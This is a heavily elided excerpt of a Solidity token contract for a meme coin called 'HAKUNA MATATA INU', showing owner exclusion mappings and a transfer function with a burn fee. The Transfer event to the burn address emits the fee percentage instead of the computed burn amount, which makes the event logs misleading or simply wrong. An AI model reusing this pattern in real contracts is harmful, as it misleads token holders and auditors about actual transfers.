...
contract HAKUNAMATATAINU  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "HAKUNA MATATA INU";
    string private _symbol = "HAKUNA MATATA";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        && to != address(this)) { _bruntoken = amount.mul(_burnfee).div(100);}
        ...
        if (_burnfee > 0) {
        emit Transfer(form, hole, _burnfee);
        }
